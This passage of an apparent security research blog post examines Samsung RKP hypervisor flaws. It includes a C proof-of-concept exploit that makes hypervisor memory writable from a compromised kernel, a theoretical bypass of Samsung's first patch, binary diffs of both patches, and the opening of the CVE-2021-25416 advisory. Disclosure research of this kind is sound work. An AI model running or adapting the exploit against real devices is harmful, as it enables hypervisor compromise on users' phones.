    <span class="k">if</span> <span class="p">((</span><span class="n">pte_val</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="o">||</span> <span class="n">get_pxn_bit_of_desc</span><span class="p">(</span><span class="n">pte_val</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span>
      <span class="n">allowed</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">else</span>
      <span class="n">allowed</span> <span class="o">=</span> <span class="n">rkp_deferred_inited</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">allowed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">rkp_phys_map_unlock</span><span class="p">(</span><span class="n">ptep_pa</span><span class="p">);</span>
  <span class="c1">// ...</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allowed</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">pxn_bit</span> <span class="o">=</span> <span class="n">get_pxn_bit_of_desc</span><span class="p">(</span><span class="n">pte_val</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">rkp_policy_violation</span><span class="p">(</span><span class="s">"Write L3 to wrong page type, %lx, %lx, %x"</span><span class="p">,</span> <span class="n">ptep_pa</span><span class="p">,</span> <span class="n">pte_val</span><span class="p">,</span> <span class="n">pxn_bit</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">set_entry_of_pgt</span><span class="p">(</span><span class="n">ptep_pa</span><span class="p">,</span> <span class="n">pte_val</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<div id="set_entry_of_pgt">


<div class="codehilite"><pre><span></span><code><span class="kt">uint64_t</span> <span class="o">*</span><span class="nf">set_entry_of_pgt</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="n">ptr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
  <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>



</div>

<p><code>ptep</code> (the descriptor's address) is marked as <code>FREE</code> in the <code>physmap</code>, and <code>pte_val</code> (the descriptor's value) <code>&amp; 3 == 1</code>, so we can call <code>set_entry_of_pgt</code> with our values.</p>
<h3 id="proof-of-concept">Proof of Concept<a class="headerlink" href="#proof-of-concept" title="Permanent link">¶</a></h3>
<p>For this simple proof of concept code, we're assuming that the 
attacker has an arbitrary read/write of kernel memory, as well as the 
ability to make hypervisor calls.</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#define UH_APP_RKP 0xc300c002</span>

<span class="cp">#define RKP_CMD_NEW_PGD    0x0a</span>
<span class="cp">#define RKP_CMD_FREE_PGD   0x09</span>
<span class="cp">#define RKP_CMD_WRITE_PGT3 0x05</span>

<span class="cp">#define PROTECTED_RANGES_BITMAP 0x870473D8</span>
<span class="cp">#define BLOCK_DESC_ADDR         0x8702a1c0</span>
<span class="cp">#define BLOCK_DESC_DATA         0x870004fd</span>

<span class="kt">uint64_t</span> <span class="nf">pa_to_va</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">va</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">pa</span> <span class="o">-</span> <span class="mh">0x80000000UL</span> <span class="o">+</span> <span class="mh">0xffffffc000000000UL</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="cm">/* allocate and clear our "fake PGD" */</span>
    <span class="kt">uint64_t</span> <span class="n">pgd</span> <span class="o">=</span> <span class="n">kernel_alloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span>
        <span class="n">kernel_write</span><span class="p">(</span><span class="n">pgd</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="mi">0UL</span><span class="p">);</span>

    <span class="cm">/* write our "fake PMD" descriptor */</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">pgd</span><span class="p">,</span> <span class="p">(</span><span class="n">PROTECTED_RANGES_BITMAP</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFF000UL</span><span class="p">)</span> <span class="o">|</span> <span class="mi">3UL</span><span class="p">);</span>

    <span class="cm">/* make the hyp call that will set the page RO */</span>
    <span class="n">kernel_hyp_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_CMD_NEW_PGD</span><span class="p">,</span> <span class="n">pgd</span><span class="p">);</span>
    <span class="cm">/* make the hyp call that will set the page RW */</span>
    <span class="n">kernel_hyp_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_CMD_FREE_PGD</span><span class="p">,</span> <span class="n">pgd</span><span class="p">);</span>

    <span class="cm">/* zero out the "protected ranges" first entry */</span>
    <span class="n">kernel_write</span><span class="p">(</span><span class="n">pa_to_va</span><span class="p">(</span><span class="n">PROTECTED_RANGES_BITMAP</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="mi">0UL</span><span class="p">);</span>

    <span class="cm">/* write the descriptor to make hyp memory writable */</span>
    <span class="n">kernel_hyp_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_CMD_WRITE_PGT3</span><span class="p">,</span>
                    <span class="n">pa_to_va</span><span class="p">(</span><span class="n">BLOCK_DESC_ADDR</span><span class="p">),</span> <span class="n">BLOCK_DESC_DATA</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>The exploit was successfully tested on the most recent firmware available for our test device (at the time of the report): <code>A515FXXU4CTJ1</code>.
 The two-fold bug appeared to be present in the binaries of both Exynos 
and Snapdragon devices, including the S10/S10+/S20/S20+ flagship 
devices, but its exploitability on these devices is uncertain.</p>
<p>The prerequisites for exploiting this vulnerability are high: being 
able to make an hypervisor call with only an arbitrary read and write of
 kernel memory is no small feat on devices where JOPP/ROPP are enabled.</p>
<p>In particular, on Snapdragon devices, the <code>s2_map</code> function (called from <code>rkp_s2_page_change_permission</code> and <code>rkp_s2_range_change_permission</code>)
 makes an indirect call to a QHEE function (since it is QHEE that is in 
charge of the page tables). We did not follow this call to see if it 
made any additional checks. On the Galaxy S20, there is also an indirect
 call to the new hypervisor framework (called H-Arx), but we did not 
follow it either.</p>
<p>The memory layout will also be different on other devices than the 
one we have targeted in the exploit, so the hard-coded addresses won't 
work. But we believe that they can be adapted, or that an alternative 
exploitation strategy can be found for those devices.</p>
<h2 id="patch">Patch<a class="headerlink" href="#patch" title="Permanent link">¶</a></h2>
<p>Here are the immediate remediation steps we suggested to Samsung:</p>
<div class="codehilite"><pre><span></span><code>- Mark the pages unmapped by s2_unmap as S2UNMAP in the physmap
- Perform the additional checks of rkp_s2_page_change_permission in
rkp_s2_range_change_permission as well
- Add calls to check_kernel_input in the rkp_lxpgt_process_table functions
</code></pre></div>

<h3 id="first-patch">First Patch<a class="headerlink" href="#first-patch" title="Permanent link">¶</a></h3>
<p>To see how Samsung patched this vulnerability, we binary diffed the 
most recent firmware available for the Samsung Galaxy S10 (at the time 
of checking the first patch): <code>G973FXXSBFUF3</code>. We could not 
use the latest firmware for the Samsung Galaxy A51 as this device had 
not been updated to the June patch level yet.</p>
<p>There have been some changes to <code>rkp_s2_page_change_permission</code> (and none to <code>rkp_s2_range_change_permission</code>):</p>
<div class="codehilite"><pre><span></span><code>int64_t rkp_s2_page_change_permission(void* p_addr,
                                      uint64_t access,
<span class="gi">+                                      uint32_t type,</span>
                                      uint32_t exec,
                                      uint32_t allow) {
  // ...

  if (!allow &amp;&amp; !rkp_inited) {
    // ...
<span class="gd">-    return -1;</span>
<span class="gi">+    return rkp_phys_map_set(p_addr, type) ? -1 : 0;</span>
  }
  if (is_phys_map_s2unmap(p_addr)) {
    // ...
<span class="gd">-    return -1;</span>
<span class="gi">+    return rkp_phys_map_set(p_addr, type) ? -1 : 0;</span>
  }
  if (page_allocator_is_allocated(p_addr) == 1
        || (p_addr &gt;= TEXT_PA &amp;&amp; p_addr &lt; ETEXT_PA)
        || (p_addr &gt;= rkp_get_pa(SRODATA) &amp;&amp; p_addr &lt; rkp_get_pa(ERODATA))
<span class="gd">-    return 0;</span>
<span class="gi">+    return rkp_phys_map_set(p_addr, type) ? -1 : 0;</span>
  // ...
<span class="gi">+  if (access == 0x80) {</span>
<span class="gi">+    if (rkp_phys_map_set(p_addr, type) || rkp_set_pgt_bitmap(p_addr, access))</span>
<span class="gi">+      return -1;</span>
<span class="gi">+  }</span>
  if (map_s2_page(p_addr, p_addr, 0x1000, attrs) &lt; 0) {
    rkp_policy_violation("map_s2_page failed, p_addr : %p, attrs : %d", p_addr, attrs);
    return -1;
  }
  tlbivaae1is(((p_addr + 0x80000000) | 0xFFFFFFC000000000) &gt;&gt; 12);
<span class="gd">-  return rkp_set_pgt_bitmap(p_addr, access);</span>
<span class="gi">+  if (access != 0x80)</span>
<span class="gi">+    if (rkp_phys_map_set(p_addr, type) || rkp_set_pgt_bitmap(p_addr, access))</span>
<span class="gi">+      return -1;</span>
<span class="gi">+  return 0;</span>
</code></pre></div>

<ul>
<li>the new <code>physmap</code> type is given as argument to the function;</li>
<li>on failure of the checks (there are unchanged themselves), the new <code>physmap</code> type is set anyway;</li>
<li>if the access is read-only, the <code>physmap</code> type is set, then the page is set as 0 in the <code>ro_bitmap</code>, and finally the page is mapped in the stage 2;</li>
<li>if the access is read-write, the page is mapped in the stage 2, then it is set as 1 in the <code>ro_bitmap</code>, and finally the <code>physmap</code> type is set.</li>
</ul>
<p>So far, nothing in the changes prevent using these 2 functions remap previously unmapped memory.</p>
<p>There have also been some changes to the <code>rkp_lxpgt_process_table</code> functions:</p>
<div class="codehilite"><pre><span></span><code>int64_t rkp_l1pgt_process_table(int64_t pgd, uint32_t high_bits, uint32_t is_alloc) {
  // ...
  if (is_alloc) {
<span class="gi">+    check_kernel_input(pgd);</span>
    // ...
  } else {
    // ...
  }
  // ...
}
</code></pre></div>

<div class="codehilite"><pre><span></span><code>int64_t rkp_l2pgt_process_table(int64_t pmd, uint64_t start_addr, uint32_t is_alloc) {
  // ...
  if (is_alloc) {
<span class="gi">+    check_kernel_input(pmd);</span>
    // ...
  } else {
    // ...
  }
}
</code></pre></div>

<div class="codehilite"><pre><span></span><code>int64_t rkp_l3pgt_process_table(int64_t pte, uint64_t start_addr, uint32_t is_alloc, int32_t protect) {
  // ...
  if (is_alloc) {
<span class="gi">+    check_kernel_input(pte);</span>
    // ...
  } else {
    // ...
  }
  // ...
}
</code></pre></div>

<p>For the allocation path, the <code>rkp_lxpgt_process_table</code> functions now call <code>check_kernel_input</code>
 before changing the permissions of the page and processing it. This 
makes it so that we can't reuse the same exploit path to call <code>rkp_s2_page_change_permission</code>, but does nothing about the other ways to call it.</p>
<p>During binary diffing, we did not find a change that fixes the actual
 issue: pages unmapped in the stage 2 were still not marked as <code>S2UNMAP</code> in the <code>physmap</code>.
 So we started looking for a new exploitation strategy to demonstrate to
 Samsung that their fix was not sufficient. While we did not implement 
and test it on a real device due to a lack of time, we devised the 
theoretical approach explained below.</p>
<h4 id="finding-a-new-exploit-path">Finding A New Exploit Path<a class="headerlink" href="#finding-a-new-exploit-path" title="Permanent link">¶</a></h4>
<p>As explained in the <a href="#exploring-our-options">Exploring Our Options</a> section, the <code>set_range_to_rox_l3</code> and <code>set_range_to_pxn_l3</code> functions can also be used to reach a call to <code>rkp_s2_page_change_permission</code>, but with some major caveats.</p>
<p>For <code>set_range_to_pxn_l3</code> (called from <code>rkp_set_range_to_pxn</code>):</p>
<ul>
<li>our target page memory must be marked <code>KERNEL|L3</code> in the <code>physmap</code>;</li>
<li>we must write a user-controlled descriptor into the kernel page tables;</li>
<li>the "dynamic load" feature is only available on Exynos devices.</li>
</ul>
<p>For <code>set_range_to_rox_l3</code> (called from <code>rkp_set_range_to_rox</code>):</p>
<ul>
<li>our target page will be set as read-only in the stage 2;</li>
<li>we must write a user-controlled descriptor into the kernel page tables;</li>
<li>the "dynamic load" feature is only available on Exynos devices.</li>
</ul>
<p>Nevertheless, these two functions are our only remaining options, so let's see how we can work around their quirks.</p>
<h4 id="writing-the-kernel-page-tables">Writing The Kernel Page Tables<a class="headerlink" href="#writing-the-kernel-page-tables" title="Permanent link">¶</a></h4>
<p>For our new exploitation strategy, we need a region of kernel virtual
 memory of the size of a level 2 block that is currently unmapped in the
 kernel page tables. Let's call this region's virtual address <code>kernel_va</code>. This range has an invalid/empty descriptor in the kernel level 2 page tables. Let's call that descriptor's virtual address <code>l2_desc_pa</code>.</p>
<p>We will change this invalid descriptor into a table descriptor, whose
 output address (the address of the level 3 page table) is our target 
page location in hypervisor memory that we want to remap and make 
writable from the kernel. Let's call this physical address <code>target_pa</code>.</p>
<p>To make this change, we can use the <code>rkp_cmd_write_pgt2</code> command. It calls <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l2pgt_write"><code>rkp_l2pgt_write</code></a> with the following arguments:</p>
<ul>
<li>the virtual address of the level 2 descriptor: <code>l2_desc_pa</code>;</li>
<li>the new descriptor value: <code>target_pa | 3</code>.</li>
</ul>
<p>Since we are writing to a legitimate level 2 table, <code>l2_desc_pa</code> is marked as <code>KERNEL|L2</code> in the <code>physmap</code>. The old descriptor value is 0, and the new one isn't, so we end up with a call to <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#check_single_l2e"><code>check_single_l2e</code></a> with the following arguments:</p>
<ul>
<li>a pointer to the new descriptor value on the stack;</li>
<li>the virtual address that the descriptor maps: <code>kernel_va</code>;</li>
<li><code>is_alloc == 1</code>.</li>
</ul>
<p>If we chose <code>kernel_va</code> so that it is not contained in the <code>executable_regions</code>
 memlist, the PXN bit of the new descriptor value is set. Then, because 
the new descriptor value is a table, we end up with a call to <a href="https://blog.impalabs.com/2101_samsung-rkp-compendium.html#rkp_l3pgt_process_table"><code>rkp_l3pgt_process_table</code></a> with the following arguments:</p>
<ul>
<li>the descriptor output address: <code>target_pa</code>;</li>
<li>the virtual address that the descriptor maps: <code>kernel_va</code>;</li>
<li><code>is_alloc == 1</code>;</li>
<li><code>protect == 0</code>.</li>
</ul>
<p>Because <code>protect == 0</code>, <code>rkp_l3pgt_process_table</code> will simply return early. Finally, <code>rkp_l2pgt_write</code> will write the new value of the descriptor, before returning.</p>
<h4 id="remapping-memory-as-writable">Remapping Memory As Writable<a class="headerlink" href="#remapping-memory-as-writable" title="Permanent link">¶</a></h4>
<p>Our setup is ready: we have a PMD marked as <code>KERNEL|L2</code> in the <code>physmap</code>
 containing a descriptor pointing to a PTE located in hypervisor memory.
 We can now remap the memory as writable by abusing the "dynamic 
executable" commands (available only on Exynos). We will first remap the
 memory as read-only using the <a href="#dynamic_load_ins"><code>dynamic_load_ins</code></a> function, then change it to read-write using the <a href="#dynamic_load_rm"><code>dynamic_load_rm</code></a> function.</p>
<p>The code path that needs to be taken is as follows:</p>
<div class="codehilite"><pre><span></span><code>rkp_cmd_dynamic_load
    |&gt; dynamic_load_ins
        |&gt; dynamic_load_check
            code range must be in the binary range
            must not overlap another "dynamic executable"
            must not be in the ro_bitmap
        |&gt; dynamic_load_protection
            will make the code range as RO (and add it to ro_bitmap)
        |&gt; dynamic_load_verify_signing
            if type != 3, no signature checking
        |&gt; dynamic_load_make_rox
            calls rkp_set_range_to_rox!
        |&gt; dynamic_load_add_executable
            code range added to the executable_regions
        |&gt; dynamic_load_add_dynlist
            code range added to the dynamic_load_regions
rkp_cmd_dynamic_load
    |&gt; dynamic_load_rm
        |&gt; dynamic_load_rm_dynlist
            code range is removed from dynamic_load_regions
        |&gt; dynamic_load_rm_executable
            code range is removed from executable_regions
        |&gt; dynamic_load_set_pxn
            calls rkp_set_range_to_pxn!
        |&gt; dynamic_load_rw
            will make the code range as RW (and remove it from ro_bitmap)
</code></pre></div>

<p>We need to pass the virtual address range starting at <code>kernel_va</code> to the <code>dynamic_load_xxx</code> functions. Because this range is currently unused, it will be marked as <code>FREE</code> in the <code>physmap</code> at the time of the call. Thus, all the checks should pass, and the functions <code>rkp_set_range_to_rox</code> and <code>rkp_set_range_to_pxn</code> will be called. They will remap in the stage 2 our "fake PTE", <code>target_pa</code>, as read-only first (in <code>rkp_set_range_to_rox</code>), then as read-write (in <code>rkp_set_range_to_pxn</code>).</p>
<p>As was already happening in the original exploit, if the target page 
contains quad-word values that looks like valid level 3 page table 
descriptors, then their PXN bit might be set. In that case, the target 
page needs to be writable by the hypervisor. We still target the page 
containing the memory backing the <code>protected_ranges</code> bitmap.</p>
<h3 id="second-patch">Second Patch<a class="headerlink" href="#second-patch" title="Permanent link">¶</a></h3>
<p>To see how Samsung patched this vulnerability this time around, we 
binary diffed the most recent firmware available for the Samsung Galaxy 
S10: <code>G973FXXSEFUJ2</code>.</p>
<p>There have been some changes to <code>rkp_s2_page_change_permission</code>:</p>
<div class="codehilite"><pre><span></span><code>int64_t rkp_s2_page_change_permission(void* p_addr,
                                      uint64_t access,
<span class="gd">-                                      uint32_t exec,</span>
<span class="gd">-                                      uint32_t allow) {</span>
<span class="gi">+                                      uint32_t exec) {</span>
  // ...

<span class="gd">-  if (!allow &amp;&amp; !rkp_inited) {</span>
<span class="gi">+  if (!rkp_deferred_inited) {</span>
    // ...
  }
<span class="gi">+  check_kernel_input(p_addr);</span>
  // ...
}
</code></pre></div>

<p>The function now calls <code>check_kernel_input</code>, which will ensure that the physical address is not in the <code>protected_ranges</code> memlist.</p>
<p>There have been some changes to <code>rkp_s2_range_change_permission</code> as well:</p>
<div class="codehilite"><pre><span></span><code>int64_t rkp_s2_range_change_permission(uint64_t start_addr,
                                       uint64_t end_addr,
                                       uint64_t access,
                                       uint32_t exec,
                                       uint32_t allow) {
  // ...
<span class="gd">-  if (!allow &amp;&amp; !rkp_inited) {</span>
<span class="gd">-    uh_log('L', "rkp_paging.c", 593, "s2 range change access not allowed before init");</span>
<span class="gd">-    rkp_policy_violation("Range change permission prohibited");</span>
<span class="gd">-  } else if (allow != 2 &amp;&amp; rkp_deferred_inited) {</span>
<span class="gd">-    uh_log('L', "rkp_paging.c", 603, "s2 change access not allowed after def-init");</span>
<span class="gd">-    rkp_policy_violation("Range change permission prohibited");</span>
<span class="gd">-  }</span>
<span class="gi">+  if (rkp_deferred_inited) {</span>
<span class="gi">+    if (allow != 2) {</span>
<span class="gi">+      uh_log('L', "rkp_paging.c", 643, "RKP_33605b63");</span>
<span class="gi">+      rkp_policy_violation("Range change permission prohibited");</span>
<span class="gi">+    }</span>
<span class="gi">+    if (start_addr &gt; end_addr) {</span>
<span class="gi">+      uh_log('L', "rkp_paging.c", 650, "RKP_b3952d08%llxRKP_dd15365a%llx",</span>
<span class="gi">+             start_addr, end_addr - start_addr);</span>
<span class="gi">+      rkp_policy_violation("Range change permission prohibited");</span>
<span class="gi">+    }</span>
<span class="gi">+    protected_ranges_overlaps(start_addr, end_addr - start_addr);</span>
<span class="gi">+    addr = start_addr;</span>
<span class="gi">+    do {</span>
<span class="gi">+      rkp_phys_map_lock(addr);</span>
<span class="gi">+      if (is_phys_map_s2unmap(addr))</span>
<span class="gi">+        rkp_policy_violation("RKP_1b62896c %p", addr);</span>
<span class="gi">+      rkp_phys_map_unlock(addr);</span>
<span class="gi">+      addr += 0x1000;</span>
<span class="gi">+    } while (addr &lt; end_addr);</span>
<span class="gi">+  }</span>
  // ...
}

<span class="gi">+int64_t protected_ranges_overlaps(uint64_t addr, uint64_t size) {</span>
<span class="gi">+    if (memlist_overlaps_range(&amp;protected_ranges, addr, size)) {</span>
<span class="gi">+        uh_log('L', "pa_restrict.c", 122, "RKP_03f2763e%lx RKP_a54942c8%lx", addr, size);</span>
<span class="gi">+        return uh_log('D', "pa_restrict.c", 124, "RKP_03f2763e%lxRKP_c5d4b9a4%lx", addr, size);</span>
<span class="gi">+    }</span>
<span class="gi">+    return 0;</span>
<span class="gi">+}</span>
</code></pre></div>

<p>The function now calls <code>protected_ranges_overlaps</code>, which will ensure that the physical address range does not overlap with the <code>protected_ranges</code>
 memlist, and panic if it does. Futhermore, a check has also been added 
to ensure that none of the pages of the physical address range are 
marked as <code>S2UNMAP</code> in the <code>physmap</code>.</p>
<h1 id="writing-executable-kernel-pages">Writing executable kernel pages<a class="headerlink" href="#writing-executable-kernel-pages" title="Permanent link">¶</a></h1>
<div class="codehilite"><pre><span></span><code>SVE-2021-20179 (CVE-2021-25416): Possible creating executable kernel page via abusing dynamic load functions

Severity: Moderate
Affected versions: Q(10.0), R(11.0) devices with Exynos9610, 9810, 9820, 9830
Reported on: January 5, 2021
Disclosure status: Privately disclosed.
Assuming EL1 is compromised, an improper address validation in RKP prior to SMR JUN-2021 Release 1 allows local attackers to create executable kernel page outside code area.
The patch adds the proper address validation in RKP to prevent creating executable kernel page.
</code></pre></div>

<h2 id="vulnerability_1">Vulnerability<a class="headerlink" href="#vulnerability_1" title="Permanent link">¶</a></h2>
<p>We found this vulnerability while investigating the "dynamic 
executable" feature of RKP. It allows the kernel to load Samsung-signed 
executable binaries into memory. It is only used for the <em>Fully Interactive Mobile Camera</em> (FIMC) subsystem, and since this subsystem is only part of the Exynos device, this feature is not implemented on Snapdragon.</p>
<p>In the kernel sources, we can find some examples of loading/unloading a "dynamic executable" in the functions <code>fimc_is_load_ddk_bin</code> and <code>fimc_is_load_rta_bin</code>:</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// from include/linux/rkp.h</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">dynamic_load_struct</span><span class="p">{</span>
    <span class="n">u32</span> <span class="n">type</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">binary_base</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">binary_size</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">code_base1</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">code_size1</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">code_base2</span><span class="p">;</span>
    <span class="n">u64</span> <span class="n">code_size2</span><span class="p">;</span>
<span class="p">}</span> <span class="n">rkp_dynamic_load_t</span><span class="p">;</span>

<span class="c1">// from drivers/media/platform/exynos/fimc-is2/interface/fimc-is-interface-library.c</span>
<span class="kt">int</span> <span class="nf">fimc_is_load_ddk_bin</span><span class="p">(</span><span class="kt">int</span> <span class="n">loadType</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// ...</span>
<span class="cp">#ifdef CONFIG_UH_RKP</span>
    <span class="n">rkp_dynamic_load_t</span> <span class="n">rkp_dyn</span><span class="p">;</span>
    <span class="k">static</span> <span class="n">rkp_dynamic_load_t</span> <span class="n">rkp_dyn_before</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="cp">#endif</span>
    <span class="c1">// ...</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">loadType</span> <span class="o">==</span> <span class="n">BINARY_LOAD_ALL</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">#ifdef CONFIG_UH_RKP</span>
        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rkp_dyn</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">));</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">binary_base</span> <span class="o">=</span> <span class="n">lib_addr</span><span class="p">;</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">binary_size</span> <span class="o">=</span> <span class="n">bin</span><span class="p">.</span><span class="n">size</span><span class="p">;</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">code_base1</span> <span class="o">=</span> <span class="n">memory_attribute</span><span class="p">[</span><span class="n">INDEX_ISP_BIN</span><span class="p">].</span><span class="n">vaddr</span><span class="p">;</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">code_size1</span> <span class="o">=</span> <span class="n">memory_attribute</span><span class="p">[</span><span class="n">INDEX_ISP_BIN</span><span class="p">].</span><span class="n">numpages</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
<span class="cp">#ifdef USE_ONE_BINARY</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">RKP_DYN_FIMC_COMBINED</span><span class="p">;</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">code_base2</span> <span class="o">=</span> <span class="n">memory_attribute</span><span class="p">[</span><span class="n">INDEX_VRA_BIN</span><span class="p">].</span><span class="n">vaddr</span><span class="p">;</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">code_size2</span> <span class="o">=</span> <span class="n">memory_attribute</span><span class="p">[</span><span class="n">INDEX_VRA_BIN</span><span class="p">].</span><span class="n">numpages</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
<span class="cp">#else</span>
        <span class="n">rkp_dyn</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">RKP_DYN_FIMC</span><span class="p">;</span>
<span class="cp">#endif</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">rkp_dyn_before</span><span class="p">.</span><span class="n">type</span><span class="p">)</span>
            <span class="n">uh_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_DYNAMIC_LOAD</span><span class="p">,</span> <span class="n">RKP_DYN_COMMAND_RM</span><span class="p">,(</span><span class="n">u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rkp_dyn_before</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rkp_dyn_before</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rkp_dyn</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rkp_dynamic_load_t</span><span class="p">));</span>
<span class="cp">#endif</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">fimc_is_memory_attribute_nxrw</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory_attribute</span><span class="p">[</span><span class="n">INDEX_ISP_BIN</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">err_lib</span><span class="p">(</span><span class="s">"failed to change into NX memory attribute (%d)"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
        <span class="p">}</span>

<span class="cp">#ifdef USE_ONE_BINARY</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">fimc_is_memory_attribute_nxrw</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memory_attribute</span><span class="p">[</span><span class="n">INDEX_VRA_BIN</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">err_lib</span><span class="p">(</span><span class="s">"failed to change into NX memory attribute (%d)"</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
            <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
        <span class="p">}</span>
<span class="cp">#endif</span>
        <span class="c1">// ...</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bin</span><span class="p">.</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="n">bin_size</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">lib_addr</span><span class="p">,</span> <span class="n">bin</span><span class="p">.</span><span class="n">data</span><span class="p">,</span> <span class="n">bin</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
            <span class="n">__flush_dcache_area</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">lib_addr</span><span class="p">,</span> <span class="n">bin</span><span class="p">.</span><span class="n">size</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="c1">// ...</span>
<span class="cp">#ifdef CONFIG_UH_RKP</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">uh_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_DYNAMIC_LOAD</span><span class="p">,</span> <span class="n">RKP_DYN_COMMAND_INS</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rkp_dyn</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">err_lib</span><span class="p">(</span><span class="s">"fail to load verify FIMC in EL2"</span><span class="p">);</span>
        <span class="p">}</span>
<span class="cp">#else</span>
        <span class="c1">// ...</span>
<span class="cp">#endif</span>
        <span class="c1">// ...</span>
<span class="p">}</span>
</code></pre></div>

